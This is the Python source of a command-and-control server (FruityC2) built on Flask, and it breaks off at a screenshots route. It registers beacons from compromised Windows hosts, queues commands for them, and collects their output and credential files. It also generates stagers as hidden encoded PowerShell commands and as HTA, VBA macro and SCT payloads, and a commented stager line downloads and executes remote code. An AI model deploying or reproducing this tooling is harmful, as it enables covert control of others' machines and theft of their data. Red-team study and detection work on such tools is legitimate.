#!/usr/bin/python

# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os, sys, getopt
import traceback
import re
import json
import time, datetime
import base64
import binascii
import zlib
import glob
from multiprocessing import Process
import socket
import ssl
import hashlib
import threading
import requests
from configobj import ConfigObj

# LIBS
from lib.global_data import *
from lib.Utils import *
from lib.EmpireHelpers import *
from lib.Control import *

# FLASK
from flask import Flask
from flask import Response
from flask import request
from flask import render_template
from flask import escape
from flask import make_response
from werkzeug import secure_filename
#from flask.ext.cors import CORS # DEPRECTAED
from flask_cors import CORS

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# FRUITYC2 BANNER
print_banner()

# LOAD PARAMETERS
(profileConfig, server_ip, server_port) = parseOptions(sys.argv[1:])

config = ConfigObj("config/settings.conf")

# GLOBAL VARS
if server_ip == "": server_ip = config["server"]["ip"]
if server_port == "": server_port = config["server"]["port"]

source_control_allow = config["source"]["control"]["allow"]

#sys.exit()

payload = {}
web_delivery = {}
listener = {}
listener_details = {}

profile_file = profileConfig
key = 'SECRET' # NOT IMPLEMENTED
utimestamp = int(time.time())
gdata.load_command = "ipconfig|%s" % utimestamp

control = Control()

# LOAD CONFIG
with open('config/payload.json') as data:    
    payload = json.load(data)

with open('config/web_delivery.json') as data:    
    web_delivery = json.load(data)

with open('config/listener.json') as data:    
    listener_details = json.load(data)
    for port in listener_details:
        listener[port] = ""

with open('config/target.json') as data:    
    gdata.target = json.load(data)

try:
    with open('data/credentials.json') as data:    
        gdata.credentials = json.load(data)
except: pass

try:
    with open('data/credentials_spn.json') as data:    
        gdata.credentials_spn = json.load(data)
except: pass

try:
    with open('data/credentials_ticket.json') as data:    
        gdata.credentials_ticket = json.load(data)
except: pass

# START FLASK LISTENER
def run_server(id, x):
    #context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    #context.load_cert_chain('nginx.crt', 'nginx.key')
    #app.run(host='0.0.0.0', port=int(x), debug=False, ssl_context=context)
    app.run(host='0.0.0.0', port=int(x), debug=False)

# ------ EXPERIMENTAL ---------
# REF: http://flask.pocoo.org/snippets/122/

from flask import after_this_request, request
from cStringIO import StringIO as IO
import gzip
import functools

def gzipped(f):
    @functools.wraps(f)
    def view_func(*args, **kwargs):
        @after_this_request
        def zipper(response):
            accept_encoding = request.headers.get('Accept-Encoding', '')

            if 'gzip' not in accept_encoding.lower():
                return response

            response.direct_passthrough = False

            if (response.status_code < 200 or
                response.status_code >= 300 or
                'Content-Encoding' in response.headers):
                return response
            gzip_buffer = IO()
            gzip_file = gzip.GzipFile(mode='wb', 
                                      fileobj=gzip_buffer)
            gzip_file.write(response.data)
            gzip_file.close()

            response.data = gzip_buffer.getvalue()
            response.headers['Content-Encoding'] = 'gzip'
            response.headers['Vary'] = 'Accept-Encoding'
            response.headers['Content-Length'] = len(response.data)

            return response

        return f(*args, **kwargs)

    return view_func
# ------ END EXPERIMENTAL -----

# FLASK START/STOP
def flask_init(x, port):
    app.run(host='0.0.0.0', port=int(port))
    #print "bye %s" % port # UPDATE STATUS HERE [global]
    listener_details[port]["open"] = False
    if option_debug: listener_show()

def flask_start(port):
    print "Starting Listener %s%s:%s%s" % (bcolors.BOLD, listener_details[port]["host"], port, bcolors.ENDC)
    listener[port] = threading.Thread(name=str(port), target=flask_init, args=(1,port))
    listener[port].setDaemon(True)
    listener[port].start()
    listener_details[port]["open"] = True
    if option_debug: listener_show()

def flask_stop(port):
    print "Stopping Listener %s%s:%s%s" % (bcolors.BOLD, listener_details[port]["host"], port, bcolors.ENDC)
    r = requests.get('http://127.0.0.1:%s/shutdown' % port)
    #print r.status_code
    if option_debug: listener_show()

def flask_shutdown():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

def listener_show():
    for i in listener_details:
        print listener_details[i]
    print

# LOAD JSON PROFILE
def load_profile(json_file):
    with open(json_file) as data_file:
        profile = json.loads(data_file.read())
    return profile

# SET PROFILE SERVER HEADERS
def set_headers(profile, section, resp):
    for i in profile[section]["server"]["header"]:
        key = i.split(" ")[0]
        value = re.sub('^'+key+" ", '', i)
        resp.headers[key] = value
    return resp

def save_log_raw_alert(request, level, msg):
    try:
        timestamp = int(time.time())
        data = {
            "id": timestamp,
            "timestamp": timestamp,
            "source": "%s" % request.access_route[-1],
            "useragent": "%s" % request.user_agent,
            "query": "%s" % request.query_string,
            "cookies": "%s" % request.cookies,
            "referrer": "%s" % request.referrer,
            "remote": "%s" % request.remote_addr,
            "route": "%s" % request.access_route,
            "path": "%s" % request.path,
            "level": "%s" % level,
            "msg": "%s" % msg
        }
        f = open('logs/alert.json', 'a+')
        f.write(json.dumps(data) + "\n")
        f.close()
    except:
        print traceback.print_exc()

def debug_request(request):
    print "%s\n" % request.access_route[-1],
    print "%s\n" % request.user_agent,
    print "%s\n" % request.query_string,
    print "%s\n" % request.cookies,
    print "%s\n" % request.referrer,
    print "%s\n" % request.remote_addr,
    print "%s\n" % request.access_route,
    print "%s\n" % request.path,

# RETURN HEADERS FOR ACCESS DENIED
def get_profile_headers_denied():
    profile = load_profile(profile_file)   
    resp = make_response(render_template('errors/404.html'), 404)
    resp = set_headers(profile, "http-get", resp)
    return resp

# GET POWERSHELL AGENT
def getAgentPS():
    with open('agent/ps_agent.ps1') as f:
        data = f.read()

    data = strip_powershell_comments(data)
    return data

# VERIFY IF SOURCE IP IS ALLOWED
def validate_source_ip(request):
    source_ip = request.access_route[-1]
    allowed = source_control_allow
    if source_ip not in allowed:
        save_log_raw_alert(request, "high", "unauthorized access attempt")
        if option_debug:
            print "%s%s[!]%s Unauthorized Access Attempt: %s" % (bcolors.RED, bcolors.BOLD, bcolors.ENDC, source_ip)
            print "User-Agent: %s" % request.user_agent
            print "Query: %s" % request.query_string
            print "Cookies: %s" % request.cookies
            print "Referrer: %s" % request.referrer
            print "Remote: %s" % request.remote_addr
            print "Route: %s" % str(request.access_route)
            print "Path: %s" % str(request.path)
            print
        resp = Response(".")
        return True
    else:
        return False

def beaconSendTask(request):
    profile = load_profile(profile_file)
    
    timestamp = int(time.time())
    
    #target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
    session_id = profile["session_id"]
    target_data = rx_data(request.cookies.get(session_id)).split("|")
    
    uuid = target_data[0]
    os_version = target_data[1]
    user = target_data[2]
    label = target_data[3]
    name = target_data[4]
    ip = target_data[5]
    os_arch = "32-bit" # target_data[6] # NOT IMPLEMENTED
    
    if uuid not in gdata.target:
        print "%s%s[NEW BEACON]%s" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC)
        print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, uuid)
        print "%sVERSION:%s %s" % (bcolors.BOLD, bcolors.ENDC, os_version)
        
        gdata.target[uuid] = {
            "os_version": os_version,
            "os_arch": os_arch,
            "name": name,
            "ip": ip,
            "exec": "",
            "last_command": "",
            "sleep": 5,
            "user": user,
            "checkin": timestamp,
            "level": int(label) # 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System :: [Integrity Level]
            }
        
        store_target() # STORE TARGETS
        save_log_json(uuid) # STORE LOGS
        
        #resp = Response(".|0") # THIS NEEDS TO BE CHANGED
        resp = Response("") # THIS NEEDS TO BE CHANGED
        
        # SET PROFILE
        resp = set_headers(profile, "http-get", resp)
        
        return resp
    
    elif gdata.target[uuid]["exec"] != "":
        print "%s%s[BEACON]%s" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC)
        print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, uuid)
        print "%sVERSION:%s %s" % (bcolors.BOLD, bcolors.ENDC, os_version)
        print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, gdata.target[uuid]["exec"][:20])
        print
        
        gdata.target[uuid]["checkin"] = timestamp
        
        save_log_json(uuid) # STORE LOGS
        
        data = tx_data(gdata.target[uuid]["exec"]) # ENCRYPT/ENCODE DATA TO TRANSFER
        gdata.target[uuid]["exec"] = ""
        
        return data # load_command encoded B64
    
    elif uuid in gdata.target:
        gdata.target[uuid]["checkin"] = timestamp
    
    data = tx_data("?|0") # ENCRYPT/ENCODE DATA TO TRANSFER [THIS NEEDS TO BE CHANGED]

    #resp = Response(data)
    resp = Response("")
    
    # SET PROFILE
    resp = set_headers(profile, "http-get", resp)
    return resp

def beaconGetData(request):
    profile = load_profile(profile_file)
    
    try:
        if option_base64:
            data = request.data
            data = data.replace("send=", "")
            data = data.replace(profile["http-post"]["client"]["id"][0]+"=", "")
            #print data
            data_size = sys.getsizeof(data)

            data = rx_data(data) # DECODE/DECRYPT RECEIVED DATA
            data = data.split("\n")
        else:
            data = request.data
            data = data.replace("send=", "")
            data = data.replace(profile["http-post"]["client"]["id"][0]+"=", "")
            data = rx_data(data) # DECODE/DECRYPT RECEIVED DATA
            data_size = sys.getsizeof(data)
            data = data.split("\n")
        
        # GET TARGET UNIQID
        uuid = get_uuid(request)["uuid"]
        # OLD [SEND]
        print "%s%s[SEND-TASK]%s" % (bcolors.CYAN, bcolors.BOLD, bcolors.ENDC)
        print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, uuid)
        print "%s%s[+]%s %s bytes" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC, data_size)
        print

        content = ""
        for line in data:
            if option_debug: print line.strip()
            content += line.strip() + "\n"
        
        last_command = gdata.target[uuid]["last_command"].strip()
        if option_debug: print "DEBUG: %s" % last_command
        
        # PROCESS RESPONSE FROM AGENT/TARGET
        content = control.get_response(content, last_command, uuid)
            
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_log_raw(uuid, "[+] received %s bytes \n[+] received output (%s): \n" % (data_size, str(now)))
        save_log_raw(uuid, content)
        
        resp = Response(".")
        
        # SET PROFILE
        resp = set_headers(profile, "http-get", resp)
    
        return resp
        
    except:
        print traceback.print_exc()
        return "error.."

def setAgent(request):
    profile = load_profile(profile_file)

    data = "%s" % profile["sleeptime"]
    data += "|%s" % profile["jitter"]
    data += "|%s" % profile["useragent"]
    data += "|%s" % profile["http-get"]["uri"]
    data += "|%s" % profile["http-post"]["uri"]
    data += "|%s" % profile["http-post"]["client"]["id"][0]
    data += "|%s" % profile["session_id"]
    data += "|%s" % base64.b64encode(getAgentPS())
    
    timestamp = int(time.time())
    
    #target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
    #session_id = profile["session_id"]
    #target_data = rx_data(request.cookies.get(session_id)).split("|")
    
    # SEARCH SESSION_ID
    #print request.cookies
    for cookie_name in request.cookies:
        try:
            target_data = rx_data(request.cookies.get(cookie_name)).split("|")
        except: pass
    
    uuid = target_data[0]
    os_version = target_data[1]
    user = target_data[2]
    label = target_data[3]
    name = target_data[4]
    ip = target_data[5]
    
    if uuid not in gdata.target:
        print "%s%s[NEW BEACON STAGER]%s" % (bcolors.GREEN, bcolors.BOLD, bcolors.ENDC)
        print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, uuid)
        print "%sVERSION:%s %s" % (bcolors.BOLD, bcolors.ENDC, os_version)
        print
        
        gdata.target[uuid] = {
            "os_version": os_version,
            "name": name,
            "ip": ip,
            "exec": "",
            "last_command": "",
            "sleep": 5,
            "user": user,
            "checkin": timestamp,
            "level": int(label) # 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System :: [Integrity Level]
            }
        
        store_target() # STORE TARGETS
        save_log_json(uuid) # STORE LOGS
        
        resp = Response(tx_data(data))
        
        # SET PROFILE
        resp = set_headers(profile, "http-get", resp)
        return resp

# START FLASK
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = "uploads"
CORS(app) # Flask-Cors

@app.route('/')
@app.route('/index')
def index():
    profile = load_profile(profile_file)
    save_log_raw_alert(request, "low", "default")
    
    #return render_template('index.html'), 200
    resp = make_response(render_template('index.html'), 200)
    resp = set_headers(profile, "http-get", resp)
    return resp

def get_uuid(request):
    profile = load_profile(profile_file)
    
    #target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
    session_id = profile["session_id"]
    target_data = rx_data(request.cookies.get(session_id)).split("|")
    
    #print target_data
    uuid = target_data[0]
    os_version = target_data[1]
    user = target_data[2]
    label = target_data[3]
    name = target_data[4]
    ip = target_data[5]
    os_arch = "32-bit" #target_data[6]
    
    data = {}
    data["uuid"] = uuid
    data["os_version"] = os_version
    data["user"] = user
    data["label"] = label
    data["name"] = name
    data["ip"] = ip
    data["os_arch"] = os_arch
    
    return data

@app.route('/control/<command>')
def bot_control(command):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    print "x..."
    utimestamp = int(time.time())
    gdata.load_command = ("%s|%s") % (command, utimestamp)
    return gdata.load_command

# SET COMMANDS AND ACTIONS
@app.route('/control', methods=['GET'])
def bot_control_get():
    #debug_request(request)
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    

    try:
        print "%s%s[SET-TASK]%s" % (bcolors.RED, bcolors.BOLD, bcolors.ENDC)
    
        param = request.args.get('v')
        param_target = request.args.get('t')
        if (param_target) == "":
            print "ERROR: TARGET NOT SELECTED\n"
            return Response(json.dumps("ERROR: TARGET NOT SELECTED"))
        
        print "%sUUID:%s %s" % (bcolors.BOLD, bcolors.ENDC, param_target)
        print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, param)
        print
        gdata.target[param_target]["last_command"] = param
        
        save_log_raw(param_target, "[*] set command: %s \n" % param[:100])
        
        # SET CONTROL COMMAND
        _exec = control.set_command(param, param_target)
            
        resp = Response(json.dumps(_exec))
        return resp
    except:
        print traceback.print_exc()
        return Response(json.dumps("ERROR_CONTROL"))

# TARGET DETAILS [JSON]
@app.route('/target')
def get_target():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    #if validate_source_ip(request): return render_template('errors/403.html'), 403

    resp = Response(json.dumps(gdata.target))
    return resp

# EXIT TARGET
@app.route('/target_exit')
def target_exit():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    param_target = request.args.get('t')
    del gdata.target[param_target]
    store_target()
    
    resp = Response("done")
    return resp

# -----------------------
# PAYLOADS
# -----------------------

# SET PAYLOAD 
def set_payload_template(template, payload_code, listener_id):
    profile = load_profile(profile_file)
    
    #useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    useragent = profile["useragent"]
    path = profile["http-get"]["uri"]
    domain = listener_details[listener_id]["host"]
    port = str(listener_id)
    
    data = ""
    with open(template) as f:
        for line in f:
            #line = line.strip()
            
            if "**useragent**" in line:
                line = line.replace("**useragent**", useragent)
            if "**domain**" in line:
                line = line.replace("**domain**", domain)
            if "**port**" in line:
                line = line.replace("**port**", port)
            if "**path**" in line:
                line = line.replace("**path**", path)
            if "**payload_code**" in line:
                line = line.replace("**payload_code**", payload_code)
            data += line
            
    return data

# GENERATE CODE
@app.route('/generate/<gen_listener>/<gen_payload>')
def generate_code(gen_listener, gen_payload):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global listener_details
    
    useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    domain = listener_details[gen_listener]["host"]
    #port = "80"
    port = str(gen_listener)
    path = "agent"
    #stager = "$ua = '%s';$u = 'http://%s/agent';$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials = [System.Net.CredentialCache]::DefaultCredentials;$wc = New-Object System.Net.WebClient;$wc.proxy = $p;$wc.Headers.add('accept','*/*');$wc.Headers.Add('user-agent',$ua);IEX $wc.DownloadString($u);" % (useragent, domain)
    #stager = set_payload_template("payload_template/stager.txt","", gen_listener)
    stager = set_payload_template("agent/ps_stager.ps1","", gen_listener)
    stager = strip_powershell_comments(stager)

    if gen_payload == "powershell":
        #data = "powershell -nop -w hidden -c \"%s\"" % stager
        data = "%s" % stager
        
    elif gen_payload == "powershell-command":
        # Powershell EncodedCommand output
        data = "powershell -nop -w hidden -e %s" % powershell_encoder_deflate(stager)
        #data = "powershell -nop -w hidden -e %s" % powershell_encoder(data)
        
    elif gen_payload == "hta":
        payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder_deflate(stager)
        data = set_payload_template("payload_template/payload_hta.txt", payload_code, gen_listener)
        
    elif gen_payload == "vba":
        
        line = powershell_encoder_deflate(stager)
        n = 900
        encoded_chunks = [line[i:i+n] for i in range(0, len(line), n)]
        
        payload_code = "\"powershell.exe -nop -w hidden -e \"\n"
        for i in encoded_chunks:
            payload_code += "Code = Code & \"%s\"\n" % i

        #payload_code = payload_code[:-5]
        #payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder(stager)
        data = set_payload_template("payload_template/payload_vba.txt", payload_code, gen_listener)
    
    elif gen_payload == "sct":
        payload_code = "powershell.exe -nop -w hidden -e %s" % powershell_encoder_deflate(stager)
        data = set_payload_template("payload_template/payload_sct.txt", payload_code, gen_listener)
    
    data = base64.b64encode(data)
    resp = Response(json.dumps(data))
    return resp

# GET TARGET LOG
@app.route('/log/<uuid>')
def target_log(uuid):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    f = "logs/target/%s.log" % uuid
    if os.path.exists(f):
        n = 1000
        offset=0
        stdin,stdout = os.popen2("tail -n "+str(n)+" "+f)
        stdin.close()
        lines = stdout.readlines(); stdout.close()
        output = ""
        for line in lines:
            output += line
        #print output
    else:
        output = ""
        pass
    resp = Response(output)
    return resp

# SAVE CONFIG JSON
def save_config_json(config_file, data):
    f = open(config_file, 'w')
    f.write(json.dumps(data))
    f.close()

# PAYLOAD DETAILS [JSON]
@app.route('/payload', methods=['GET'])
def get_payload():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global payload
    
    v_id = request.args.get("id")
    
    if v_id == None or v_id == "":
        resp = Response(json.dumps(payload))
    else:
        resp = Response(json.dumps(payload[v_id]))
    
    return resp

# WEB DELIVERY DETAILS [JSON]
@app.route('/web_delivery')
def get_web_delivery():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global web_delivery
    
    v_id = request.args.get("id")
    
    if v_id == None or v_id == "":
        resp = Response(json.dumps(web_delivery))
    else:
        resp = Response(json.dumps(web_delivery[v_id]))
    
    return resp

# ADD PAYLOAD
@app.route('/payload/add', methods=['POST'])
def payload_add():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global payload
    
    v_name = request.form.get('name')
    v_payload = request.form.get('payload')
    
    timestamp = str(int(time.time()))
    
    payload[timestamp] = {"name": v_name,
                          "payload": base64.b64encode(v_payload)
                          }
    
    # STORE PAYLOAD CONFIG
    save_config_json("config/payload.json", payload)
    
    resp = Response("Ok")
    return resp

# DEL PAYLOAD
@app.route('/payload/del', methods=['GET'])
def payload_del():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global payload
    
    v_id = request.args.get('id')
    del payload[v_id]
     
    # STORE PAYLOAD CONFIG
    save_config_json("config/payload.json", payload)
    
    resp = Response("Ok")
    return resp

# UPDATE PAYLOAD
@app.route('/payload/update', methods=['POST'])
def payload_update():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global payload
    
    v_id = request.form.get('id')
    v_name = request.form.get('name')
    v_payload = request.form.get('payload')
    
    payload[v_id] = {"name": v_name,
                      "payload": base64.b64encode(v_payload)
                    }
    
    # STORE PAYLOAD CONFIG
    save_config_json("config/payload.json", payload)
    
    resp = Response("Ok")
    return resp

# ADD WEB DELIVERY
@app.route('/web_delivery/add', methods=['POST'])
def web_delivery_add():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global web_delivery
    
    v_name = request.form.get('name')
    v_path = request.form.get('path')
    v_type = request.form.get('type')
    v_filename = request.form.get('filename')
    v_payload_type = request.form.get('payload_type')
    v_payload_id = request.form.get('payload_id')
    
    timestamp = str(int(time.time()))
    
    web_delivery[timestamp] = {"name": v_name,
                          "path": v_path,
                          "type": v_type,
                          "filename": v_filename,
                          "payload_type": v_payload_type,
                          "payload": v_payload_id,
                          }
    
    # STORE PAYLOAD CONFIG
    save_config_json("config/web_delivery.json", web_delivery)

    resp = Response("Ok")
    return resp

# UPDATE PAYLOAD
@app.route('/web_delivery/update', methods=['POST'])
def web_delivery_update():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global web_delivery
    
    v_id = request.form.get('id')
    v_name = request.form.get('name')
    v_path = request.form.get('path')
    v_type = request.form.get('type')
    v_filename = request.form.get('filename')
    v_payload_type = request.form.get('payload_type')
    v_payload_id = request.form.get('payload_id')
    
    web_delivery[v_id] = {"name": v_name,
                          "path": v_path,
                          "type": v_type,
                          "filename": v_filename,
                          "payload_type": v_payload_type,
                          "payload": v_payload_id,
                          }
    
    # STORE PAYLOAD CONFIG
    save_config_json("config/web_delivery.json", web_delivery)
    
    resp = Response("Ok")
    return resp

# DEL WEB DELIVERY
@app.route('/web_delivery/del', methods=['GET'])
def web_delivery_del():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global web_delivery
    
    v_id = request.args.get('id')
    del web_delivery[v_id]
     
    # STORE WEB DELIVERY CONFIG
    save_config_json("config/web_delivery.json", web_delivery)
    
    resp = Response("Ok")
    return resp

# LIST PROFILES
@app.route('/profiles')
def list_profiles():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    profiles = glob.glob("profiles/*.json")
    
    resp = Response(json.dumps(profiles))
    return resp

# LISTENER
@app.route('/listener', methods=['GET'])
def list_listener():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global listener
    global listener_details
    
    for i in listener_details:
        if check_port(int(i)):
            listener_details[i]["open"] = True
        else:
            listener_details[i]["open"] = False
    
    v_id = request.args.get("id")
    
    if v_id == None or v_id == "":
        resp = Response(json.dumps(listener_details))
    else:
        resp = Response(json.dumps(listener_details[v_id]))
    
    resp.headers['Server'] = 'Nginx'
    return resp

# LISTENER ADD
@app.route('/listener/add', methods=['POST'])
def listener_add():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global listener
    global listener_details
    
    v_port = request.form.get('port')
    v_name = request.form.get('name')
    v_host = request.form.get('host')
    
    timestamp = str(int(time.time()))
    
    listener[v_port] = ""
    listener_details[v_port] = {"name": v_name,
                        "host": v_host,
                        "ssl": False,
                        "open": False
                          }
    
    # STORE LISTENER CONFIG
    save_config_json("config/listener.json", listener_details)
    
    resp = Response("Ok")
    return resp

# LISTENER DELETE
@app.route('/listener/del/<port>')
def listener_del(port):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global listener
    global listener_details
    
    try:
        resp = Response(json.dumps("Delete %s" % port))
        #listener[port].terminate()
        flask_stop(port)
        del listener[port]
        del listener_details[port]
        
        # STORE LISTENER CONFIG
        save_config_json("config/listener.json", listener_details)
    except:
        print "ERROR..."
        print traceback.print_exc()
        resp = Response(json.dumps("ERROR"))
    
    return resp

# LISTENER UPDATE
@app.route('/listener/update', methods=['POST'])
def listener_update():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global listener
    global listener_details
    
    v_id = request.form.get('id')
    v_name = request.form.get('name')
    v_host = request.form.get('host')
    
    listener_details[v_id] = {"name": v_name,
                     "host": v_host,
                     "ssl": False,
                     "open": False
                    }
    
    # STORE LISTENER CONFIG
    save_config_json("config/listener.json", listener_details)
    
    resp = Response("Ok")
    return resp

@app.route('/listener/<port>')
def add_listener(port):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global listener
    
    port = int(port)
    
    if check_port(port):
        resp = Response("Port %s is already open" % port)
    else:
        resp = Response("ADDED: %s" % port)
        
        listener[port] = Process(target=run_server, args=(1, int(port)))
        listener[port].start()

    #resp.headers['Access-Control-Allow-Origin'] = '*'
    resp.headers['Server'] = 'Nginx'

    #print listener
    return resp

@app.route('/listener/<port>/<action>')
def set_listener(port, action):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global listener

    try:
        #port = int(port)
        if action == "start":
            if check_port(port):
                resp = Response(json.dumps("Port %s is already open" % port))
            else:
                flask_start(port)
                resp = Response(json.dumps("Start %s" % port))
                '''
                listener[port] = Process(target=run_server, args=(1, int(port)))
                listener[port].start()
                '''
        if action == "stop":
            flask_stop(port)
            resp = Response(json.dumps("Stop %s" % port))
            
            ##listener[port].terminate()
            #listener[port].join()
    except:
        print "ERROR..."
        print traceback.print_exc()
        resp = Response(json.dumps("ERROR"))
    
    resp.headers['Server'] = 'Nginx'

    #print listener
    return resp

# CHAT
@app.route('/chat')
def chat_load():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    output = load_chat()
    
    resp = Response(json.dumps(output))
    resp.headers['Server'] = 'Nginx'
    return resp

@app.route('/chat/msg/<cid>')
def chat_get(cid):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    output = load_chat(cid)
    
    resp = Response(json.dumps(output))
    resp.headers['Access-Control-Allow-Origin'] = '*'
    resp.headers['Server'] = 'Nginx'
    return resp

@app.route('/chat/msg', methods=['POST'])
def chat_post():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    user = escape(request.form['user'])
    msg = escape(request.form['msg'])
    store_chat(user, msg)
    
    resp = Response(json.dumps(msg))
    resp.headers['Server'] = 'Nginx'
    return resp

# ALERT
@app.route('/alert')
def alert_load():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    output = load_alert()
    
    resp = Response(json.dumps(output))
    resp.headers['Server'] = 'Nginx'
    return resp

@app.route('/alert/<aid>')
def alert_get(aid):
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    output = load_alert(aid)
    
    resp = Response(json.dumps(output))
    resp.headers['Server'] = 'Nginx'
    return resp

@app.route('/profile')
def showProfile():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    profile = load_profile(profile_file)
    
    resp = Response(json.dumps(profile))
    resp.headers['Server'] = 'Nginx'
    return resp

# LIST PAYLOAD FILES
@app.route('/payload_file')
def list_payload_file():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    payload_file = glob.glob("payload_file/*")
    payload_file = map(lambda x: str.replace(x, "payload_file/", ""), payload_file)
    
    resp = Response(json.dumps(payload_file))
    return resp

# UPLOAD PAYLOAD FILE
@app.route('/payload/upload', methods = ['GET', 'POST'])
def upload_file_action():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    if request.method == 'POST':
        f = request.files['payload_file']
        f.save("payload_file/" + secure_filename(f.filename))
        return 'file uploaded successfully'

@app.route('/payload_file/del')
def payload_file_del():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    name = request.args.get('name')
    os.remove("payload_file/"+name)
    
    resp = Response(name)
    return resp

# MODULES
@app.route('/modules')
def modules_list():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    file_paths = []
    for root, directories, files in os.walk("modules/"):
        for filename in files:
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)
    
    resp = Response(json.dumps(file_paths))
    return resp

# DOWNLOAD DATA FILE
@app.route('/data_download')
def download_data():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    data_path = request.args.get('dp')
    data_file = request.args.get('df')
    
    filepath = "data/%s/%s" % (data_path, data_file)
    data = open(filepath, "rb")
    resp = Response(data)
    resp.headers["Content-Disposition"] = "attachment; filename=" + data_file
    return resp

# LIST DOWNLOADED FILES
@app.route('/downloads')
def list_downloads():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    data = glob.glob("data/downloads/*")
    data = map(lambda x: str.replace(x, "data/downloads/", ""), data)
    
    resp = Response(json.dumps(data))
    return resp

# DELETE DOWNLOAD
@app.route('/downloads/del')
def downloads_del():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    name = request.args.get('v')
    os.remove("data/downloads/"+name)
    
    resp = Response(name)
    return resp

# LIST SCREENSHOTS FILES
@app.route('/screenshots')
